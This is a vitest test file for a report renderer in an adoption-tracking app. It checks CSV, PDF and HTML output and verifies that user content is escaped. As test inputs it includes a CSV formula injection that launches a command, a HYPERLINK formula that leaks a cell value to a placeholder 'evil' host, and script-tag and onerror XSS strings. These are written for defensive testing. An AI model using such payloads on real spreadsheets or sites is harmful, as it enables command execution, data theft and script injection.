/**
 * Behaviour tests for ReportRenderer (report-renderer.service).
 *
 * The renderers are pure transformations of SavedReport + ExecutedReport → bytes/strings
 * with no database access, so no model mocking is needed.
 *
 * We exercise:
 *   - renderCsv       → Buffer containing correct CSV sections
 *   - renderPdf       → Buffer starting with the PDF magic bytes (%PDF)
 *   - renderInlineHtml → HTML string with report name + widget data
 */
import { describe, it, expect } from 'vitest';
import { ReportRenderer } from '../../services/report-renderer.service';
import type { ExecutedReport } from '../../services/reports.service';

const metaStub = { metric: 'count', chartType: 'bar', computedAt: '2026-01-01T00:00:00.000Z' };

// Minimal SavedReport shape required by the renderer (only fields it reads).
const makeReport = (overrides: Record<string, unknown> = {}) =>
  ({
    name: 'Monthly Adoptions',
    config: {
      widgets: [
        { id: 'w1', title: 'Total Adoptions', chartType: 'bar' },
        { id: 'w2', title: 'Active Rescues', chartType: 'metric' },
      ],
    },
    toJSON: () => ({}),
    ...overrides,
  }) as unknown as Parameters<typeof ReportRenderer.renderCsv>[0];

// ExecutedReport with table-shaped data for w1 and a metric object for w2.
const makeExecuted = (): ExecutedReport => ({
  computedAt: '2026-01-01T00:00:00.000Z',
  cacheHit: false,
  filters: {},
  widgets: [
    {
      id: 'w1',
      meta: metaStub,
      data: [
        { month: 'Jan', count: 12 },
        { month: 'Feb', count: 8 },
      ],
    },
    {
      id: 'w2',
      meta: { ...metaStub, chartType: 'metric' },
      data: { total: 42, active: 38 },
    },
  ],
});

describe('ReportRenderer.renderCsv', () => {
  it('returns a Buffer', () => {
    const buf = ReportRenderer.renderCsv(makeReport(), makeExecuted());
    expect(buf).toBeInstanceOf(Buffer);
  });

  it('includes the report name and computedAt in the output', () => {
    const buf = ReportRenderer.renderCsv(makeReport(), makeExecuted());
    const text = buf.toString('utf-8');
    expect(text).toContain('Monthly Adoptions');
    expect(text).toContain('2026-01-01T00:00:00.000Z');
  });

  it('renders widget titles from the report config', () => {
    const buf = ReportRenderer.renderCsv(makeReport(), makeExecuted());
    const text = buf.toString('utf-8');
    expect(text).toContain('Total Adoptions');
    expect(text).toContain('Active Rescues');
  });

  it('falls back to widget id when config has no matching title', () => {
    const reportWithoutWidgets = makeReport({ config: { widgets: [] } });
    const buf = ReportRenderer.renderCsv(reportWithoutWidgets, makeExecuted());
    const text = buf.toString('utf-8');
    expect(text).toContain('w1');
    expect(text).toContain('w2');
  });

  it('renders tabular data as CSV rows', () => {
    const buf = ReportRenderer.renderCsv(makeReport(), makeExecuted());
    const text = buf.toString('utf-8');
    expect(text).toContain('month');
    expect(text).toContain('Jan');
    expect(text).toContain('Feb');
  });

  it('renders key-value metric objects', () => {
    const buf = ReportRenderer.renderCsv(makeReport(), makeExecuted());
    const text = buf.toString('utf-8');
    expect(text).toContain('total');
    expect(text).toContain('42');
  });

  it('handles a scalar (non-object) widget data value', () => {
    const executed: ExecutedReport = {
      computedAt: '2026-01-01T00:00:00.000Z',
      cacheHit: false,
      filters: {},
      widgets: [{ id: 'w1', meta: metaStub, data: 99 }],
    };
    const buf = ReportRenderer.renderCsv(makeReport(), executed);
    const text = buf.toString('utf-8');
    expect(text).toContain('99');
  });

  it('handles null widget data gracefully', () => {
    const executed: ExecutedReport = {
      computedAt: '2026-01-01T00:00:00.000Z',
      cacheHit: false,
      filters: {},
      widgets: [{ id: 'w1', meta: metaStub, data: null }],
    };
    expect(() => ReportRenderer.renderCsv(makeReport(), executed)).not.toThrow();
  });

  it('neutralizes CSV formula injection in the report name', () => {
    const report = makeReport({ name: '=cmd|"/c calc"!A1' });
    const buf = ReportRenderer.renderCsv(report, makeExecuted());
    const text = buf.toString('utf-8');
    expect(text).toContain("Report: '=cmd|");
    expect(text).not.toMatch(/^Report: =cmd/m);
  });

  it('neutralizes CSV formula injection inside tabular row values', () => {
    const executed: ExecutedReport = {
      computedAt: '2026-01-01T00:00:00.000Z',
      cacheHit: false,
      filters: {},
      widgets: [
        {
          id: 'w1',
          meta: metaStub,
          data: [{ rescueName: '=HYPERLINK("http://evil/?p="&A1,"click")', count: 1 }],
        },
      ],
    };
    const buf = ReportRenderer.renderCsv(makeReport(), executed);
    const text = buf.toString('utf-8');
    expect(text).toContain("'=HYPERLINK");
  });

  it('neutralizes CSV formula injection in metric-object keys and values', () => {
    const executed: ExecutedReport = {
      computedAt: '2026-01-01T00:00:00.000Z',
      cacheHit: false,
      filters: {},
      widgets: [{ id: 'w1', meta: metaStub, data: { '=evilKey': '=evilValue' } }],
    };
    const buf = ReportRenderer.renderCsv(makeReport(), executed);
    const text = buf.toString('utf-8');
    expect(text).toContain("'=evilKey");
    expect(text).toContain("'=evilValue");
  });
});

describe('ReportRenderer.renderPdf', () => {
  it('resolves to a Buffer', async () => {
    const buf = await ReportRenderer.renderPdf(makeReport(), makeExecuted());
    expect(buf).toBeInstanceOf(Buffer);
  });

  it('produces a valid PDF (starts with %PDF magic bytes)', async () => {
    const buf = await ReportRenderer.renderPdf(makeReport(), makeExecuted());
    expect(buf.slice(0, 4).toString()).toBe('%PDF');
  });

  it('is non-empty', async () => {
    const buf = await ReportRenderer.renderPdf(makeReport(), makeExecuted());
    expect(buf.length).toBeGreaterThan(0);
  });
});

describe('ReportRenderer.renderInlineHtml', () => {
  it('returns a string', () => {
    const html = ReportRenderer.renderInlineHtml(makeReport(), makeExecuted());
    expect(typeof html).toBe('string');
  });

  it('includes the report name', () => {
    const html = ReportRenderer.renderInlineHtml(makeReport(), makeExecuted());
    expect(html).toContain('Monthly Adoptions');
  });

  it('includes the computedAt timestamp', () => {
    const html = ReportRenderer.renderInlineHtml(makeReport(), makeExecuted());
    expect(html).toContain('2026-01-01T00:00:00.000Z');
  });

  it('renders a table for array-shaped widget data', () => {
    const html = ReportRenderer.renderInlineHtml(makeReport(), makeExecuted());
    expect(html).toContain('<table');
    expect(html).toContain('Jan');
    expect(html).toContain('Feb');
  });

  it('renders a definition list for object-shaped metric data', () => {
    const html = ReportRenderer.renderInlineHtml(makeReport(), makeExecuted());
    expect(html).toContain('<dl>');
    expect(html).toContain('total');
    expect(html).toContain('42');
  });

  it('produces a valid HTML shell', () => {
    const html = ReportRenderer.renderInlineHtml(makeReport(), makeExecuted());
    expect(html).toContain('<!doctype html>');
    expect(html).toContain('</html>');
  });

  describe('HTML escaping of user-controlled content', () => {
    it('escapes script tags in the report name', () => {
      const report = makeReport({ name: '<script>alert(1)</script>' });
      const html = ReportRenderer.renderInlineHtml(report, makeExecuted());
      expect(html).not.toContain('<script>alert(1)</script>');
      expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    it('escapes script tags in widget titles', () => {
      const report = makeReport({
        config: {
          widgets: [{ id: 'w1', title: '<script>alert(2)</script>', chartType: 'bar' }],
        },
      });
      const executed: ExecutedReport = {
        computedAt: '2026-01-01T00:00:00.000Z',
        cacheHit: false,
        filters: {},
        widgets: [{ id: 'w1', meta: metaStub, data: [{ month: 'Jan', count: 1 }] }],
      };
      const html = ReportRenderer.renderInlineHtml(report, executed);
      expect(html).not.toContain('<script>alert(2)</script>');
      expect(html).toContain('&lt;script&gt;alert(2)&lt;/script&gt;');
    });

    it('escapes injection attempts in table header keys', () => {
      const executed: ExecutedReport = {
        computedAt: '2026-01-01T00:00:00.000Z',
        cacheHit: false,
        filters: {},
        widgets: [
          {
            id: 'w1',
            meta: metaStub,
            data: [{ '"><img src=x onerror=alert(1)>': 'value' }],
          },
        ],
      };
      const html = ReportRenderer.renderInlineHtml(makeReport(), executed);
      expect(html).not.toContain('<img src=x onerror=alert(1)>');
      expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;');
    });

    it('escapes injection attempts in table cell values', () => {
      const executed: ExecutedReport = {
        computedAt: '2026-01-01T00:00:00.000Z',
        cacheHit: false,
        filters: {},
        widgets: [
          {
            id: 'w1',
            meta: metaStub,
            data: [{ month: '<script>alert(3)</script>' }],
          },
        ],
      };
      const html = ReportRenderer.renderInlineHtml(makeReport(), executed);
      expect(html).not.toContain('<script>alert(3)</script>');
      expect(html).toContain('&lt;script&gt;alert(3)&lt;/script&gt;');
    });

    it('escapes injection attempts in metric object keys and values', () => {
      const executed: ExecutedReport = {
        computedAt: '2026-01-01T00:00:00.000Z',
        cacheHit: false,
        filters: {},
        widgets: [
          {
            id: 'w1',
            meta: metaStub,
            data: { '<b>key</b>': '<script>alert(4)</script>' },
          },
        ],
      };
      const html = ReportRenderer.renderInlineHtml(makeReport(), executed);
      expect(html).not.toContain('<b>key</b>');
      expect(html).not.toContain('<script>alert(4)</script>');
      expect(html).toContain('&lt;b&gt;key&lt;/b&gt;');
      expect(html).toContain('&lt;script&gt;alert(4)&lt;/script&gt;');
    });

    it('escapes scalar widget data containing HTML', () => {
      const executed: ExecutedReport = {
        computedAt: '2026-01-01T00:00:00.000Z',
        cacheHit: false,
        filters: {},
        widgets: [{ id: 'w1', meta: metaStub, data: '<script>alert(5)</script>' }],
      };
      const html = ReportRenderer.renderInlineHtml(makeReport(), executed);
      expect(html).not.toContain('<script>alert(5)</script>');
      expect(html).toContain('&lt;script&gt;alert(5)&lt;/script&gt;');
    });

    it('leaves alphanumeric content unchanged (regression)', () => {
      const html = ReportRenderer.renderInlineHtml(makeReport(), makeExecuted());
      expect(html).toContain('Monthly Adoptions');
      expect(html).toContain('Total Adoptions');
      expect(html).toContain('Active Rescues');
      expect(html).toContain('Jan');
      expect(html).toContain('Feb');
      expect(html).toContain('total');
      expect(html).toContain('42');
    });
  });
});
